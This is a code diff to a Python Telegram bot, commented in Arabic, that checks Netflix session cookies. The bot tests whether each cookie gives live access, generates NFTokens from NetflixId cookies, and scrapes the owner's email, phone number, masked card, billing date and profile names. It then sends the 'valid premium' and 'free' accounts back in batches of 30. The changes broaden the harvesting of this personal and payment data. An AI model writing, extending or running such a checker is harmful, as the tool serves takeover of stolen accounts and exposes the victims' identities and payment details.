@@ -283,6 +283,7 @@ def get_full_country_name(country_code):
     return countries.get(country_code.upper(), country_code)
 
 def clean_profile_names(profiles_raw):
+    """تنقية أسماء البروفايلات مع ضمان وجود اسم واحد على الأقل"""
     if not profiles_raw:
         return [], 0
     
@@ -292,18 +293,27 @@ def clean_profile_names(profiles_raw):
         'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
         'profile', 'user', 'default', 'unknown', 'device',
         'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
+        'smartphone', 'ipod', 'watch', 'android tv', 'roku',
+        'apple tv', 'google tv', 'amazon', 'fire stick', 'chromecast',
         'api', 'akira', 'buildidentifier', 'identifier', 'null',
         'undefined', 'none', 'nil', 'false', 'true', 'build',
-        'premium', 'standard', 'basic', 'free'
+        'premium', 'standard', 'basic', 'free', 'test', 'admin'
     ]
     
     names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
     clean_names = []
+    
     for name in names_list:
         name = clean_text(name)
-        name_lower = name.lower()
-        if name_lower in forbidden_names or len(name) < 2:
+        if not name:
             continue
+        name_lower = name.lower()
+        
+        if name_lower in forbidden_names:
+            continue
+        if len(name) < 2:
+            continue
+        
         skip = False
         for forbidden in forbidden_names:
             if forbidden in name_lower:
@@ -311,13 +321,35 @@ def clean_profile_names(profiles_raw):
                 break
         if skip:
             continue
-        if re.match(r'^\d+$', name) or re.search(r'[{}[]<>]', name):
+        
+        if re.match(r'^\d+$', name):
             continue
+        if re.search(r'[{}[\]<>]', name):
+            continue
+            
         clean_names.append(name)
     
+    # إذا لم نجد أي اسم، نأخذ أول اسم من القائمة الأصلية
     if not clean_names and names_list:
-        clean_names = [clean_text(names_list[0])]
+        first_name = clean_text(names_list[0])
+        if first_name and len(first_name) >= 2:
+            clean_names.append(first_name)
+    
     return clean_names, len(clean_names)
+
+def get_name_from_profiles(info):
+    """استخراج الاسم من أول بروفايل حقيقي"""
+    profiles_raw = info.get("profiles") or ""
+    if profiles_raw:
+        clean_names, _ = clean_profile_names(profiles_raw)
+        if clean_names:
+            return clean_names[0]
+        
+        # محاولة أخيرة: أول اسم في القائمة
+        names = [p.strip() for p in profiles_raw.split(",") if p.strip()]
+        if names:
+            return clean_text(names[0])
+    return "User"
 
 def get_membership_status_display(status):
     status_map = {
@@ -337,6 +369,36 @@ def extract_payment_method_strong(html_content, info):
             return "PayPal"
         return payment
     return "Credit Card"
+
+def extract_profile_names_enhanced(response_text):
+    """استخراج أسماء البروفايلات من HTML بأنماط متعددة"""
+    names = []
+    patterns = [
+        r'"profileName"\s*:\s*"([^"]+)"',
+        r'"profiles"\s*:\s*\[(.*?)\]',
+        r'"name":"([^"]+)"',
+        r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
+        r'<div[^>]*class="profile-name"[^>]*>([^<]+)</div>',
+    ]
+    
+    for pattern in patterns:
+        if 'profiles' in pattern:
+            match = re.search(pattern, response_text, re.DOTALL)
+            if match:
+                profile_names = re.findall(r'"name":"([^"]+)"', match.group(1))
+                names.extend(profile_names)
+        else:
+            matches = re.finditer(pattern, response_text)
+            for match in matches:
+                name = decode_netflix_value(match.group(1))
+                if name and name not in names and len(name) < 50:
+                    names.append(name)
+    
+    # فلترة الأسماء الممنوعة
+    forbidden = ['chrome', 'firefox', 'safari', 'edge', 'opera', 'android', 'ios', 'windows', 'mac', 'linux']
+    filtered = [n for n in names if n.lower() not in forbidden]
+    
+    return ", ".join(filtered[:10]) if filtered else (", ".join(names[:10]) if names else None)
 
 
 # ==================== COOKIE EXTRACTION FUNCTIONS ====================
@@ -506,14 +568,6 @@ def extract_account_info(growth_account):
     
     return {k: v for k, v in info.items() if v}
 
-def get_name_from_profiles(info):
-    profiles_raw = info.get("profiles") or ""
-    if profiles_raw:
-        clean_names, _ = clean_profile_names(profiles_raw)
-        if clean_names:
-            return clean_names[0]
-    return "Unknown"
-
 def extract_info_fallback(response_text):
     extracted = {
         "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"name":"([^"]+)"']),
@@ -528,6 +582,7 @@ def extract_info_fallback(response_text):
         "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"', r'"quality":"([^"]+)"']),
         "paymentMethodType": extract_first_match(response_text, [r'"paymentMethodType":"([^"]+)"']),
         "maskedCard": extract_first_match(response_text, [r'"maskedCard":"([^"]+)"', r'"cardNumber":"([^"]+)"']),
+        "profiles": extract_profile_names_enhanced(response_text),
     }
     return {k: v for k, v in extracted.items() if v}
 
@@ -624,6 +679,80 @@ def get_language_from_html(html_content):
         return lang_names.get(lang, lang_names.get(base_lang, lang))
     return "English"
 
+def extract_all_account_details(html_content, info_dict):
+    """دالة قوية لاستخراج كل البيانات الناقصة من HTML"""
+    
+    # استخراج الإيميل
+    if not info_dict.get('email') or info_dict.get('email') == "Unknown":
+        email_patterns = [
+            r'"email"\s*:\s*"([^"]+@[^"]+)"',
+            r'"loginId"\s*:\s*"([^"]+@[^"]+)"',
+            r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"',
+        ]
+        for pattern in email_patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                info_dict['email'] = clean_text(match.group(1))
+                break
+    
+    # استخراج السعر
+    if not info_dict.get('planPrice') or info_dict.get('planPrice') == "N/A":
+        price_patterns = [
+            r'"planPrice"\s*:\s*"([^"]+)"',
+            r'"priceDisplay"\s*:\s*"([^"]+)"',
+            r'"formattedPrice"\s*:\s*"([^"]+)"',
+        ]
+        for pattern in price_patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                price = clean_text(match.group(1))
+                if price and price != "null":
+                    info_dict['planPrice'] = price
+                    break
+    
+    # استخراج تاريخ الفاتورة القادمة
+    if not info_dict.get('nextBillingDate') or info_dict.get('nextBillingDate') == "Unknown":
+        billing_patterns = [
+            r'"nextBillingDate"\s*:\s*"([^"]+)"',
+            r'"billingDate"\s*:\s*"([^"]+)"',
+        ]
+        for pattern in billing_patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                info_dict['nextBillingDate'] = clean_text(match.group(1))
+                break
+    
+    # استخراج رقم الهاتف
+    if not info_dict.get('phoneNumber') or info_dict.get('phoneNumber') == "N/A":
+        phone_patterns = [
+            r'"phoneNumber"\s*:\s*"([^"]+)"',
+            r'"rawPhoneNumber"\s*:\s*"([^"]+)"',
+        ]
+        for pattern in phone_patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                phone = clean_text(match.group(1))
+                if phone and phone != "null":
+                    info_dict['phoneNumber'] = phone
+                    break
+    
+    # استخراج تفاصيل الكارت
+    if not info_dict.get('maskedCard') or info_dict.get('maskedCard') == "N/A":
+        card_patterns = [
+            r'"maskedCard"\s*:\s*"([^"]+)"',
+            r'"cardNumber"\s*:\s*"([^"]+)"',
+            r'"lastFour"\s*:\s*"([^"]+)"',
+        ]
+        for pattern in card_patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE)
+            if match:
+                card = clean_text(match.group(1))
+                if card and card != "null":
+                    info_dict['maskedCard'] = card
+                    break
+    
+    return info_dict
+
 def create_nftoken(cookie_dict, attempts=1):
     netflix_id = cookie_dict.get("NetflixId")
     if not netflix_id:
@@ -672,17 +801,20 @@ def get_account_page(session, timeout=20):
     return "", 0, {}
 
 
-# ==================== RESULT FORMATTING (زي الأول بالتفاصيل الكاملة) ====================
+# ==================== RESULT FORMATTING ====================
 
 def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None, html_content=""):
     if config is None:
         config = load_config()
     
+    # استخراج البيانات الناقصة من HTML
+    info = extract_all_account_details(html_content, info)
+    
     plan_key, plan_label = derive_plan_info(info, is_subscribed)
     status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
     
     account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
-    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera']:
+    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'android', 'ios', 'windows', 'mac', 'linux']:
         account_name = get_name_from_profiles(info)
     
     email = decode_netflix_value(info.get("email")) or "Unknown"
@@ -799,7 +931,7 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     return "\n".join(lines), plan_key
 
 
-# ==================== PROGRESS BAR (زي الأول) ====================
+# ==================== PROGRESS BAR ====================
 
 def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
     percentage = (processed / total) * 100 if total > 0 else 0
@@ -829,7 +961,7 @@ Filter: Premium accounts only
     return message
 
 
-# ==================== TELEGRAM BOT HANDLERS (زي الأول) ====================
+# ==================== TELEGRAM BOT HANDLERS ====================
 
 async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -972,10 +1104,10 @@ Membership: {partial_info.get('membershipStatus', 'Unknown')}
             return None, None, f"HTTP {status_code}"
 
 
-# ==================== SEND RESULTS WITH SPLITTING (زي الأول) ====================
+# ==================== SEND RESULTS WITH SPLITTING (30 حساب لكل ملف) ====================
 
-async def send_large_results(update, results_by_plan, max_per_file=15):
-    """إرسال النتائج بعد تقسيمها إلى ملفات متعددة - كل 15 حساب في ملف"""
+async def send_large_results(update, results_by_plan, max_per_file=30):
+    """إرسال النتائج بعد تقسيمها إلى ملفات متعددة - كل 30 حساب في ملف"""
     for plan, results in results_by_plan.items():
         if not results or plan == "partial":
             continue
@@ -1128,8 +1260,8 @@ Speed: {spd:.2f} accounts/second
         await status_msg.delete()
         await update.message.reply_text(final)
         
-        # إرسال الملفات بالتقسيم (كل 15 حساب في ملف)
-        await send_large_results(update, results_by_plan, max_per_file=15)
+        # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
+        await send_large_results(update, results_by_plan, max_per_file=30)
         
         if results_by_plan["partial"]:
             all_partial = "".join(results_by_plan["partial"])
@@ -1286,7 +1418,8 @@ Speed: {spd:.2f} files/second
             await msg.delete()
             await update.message.reply_text(final)
             
-            await send_large_results(update, results_by_plan, max_per_file=15)
+            # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
+            await send_large_results(update, results_by_plan, max_per_file=30)
             
             if results_by_plan["partial"]:
                 all_partial = "".join(results_by_plan["partial"])
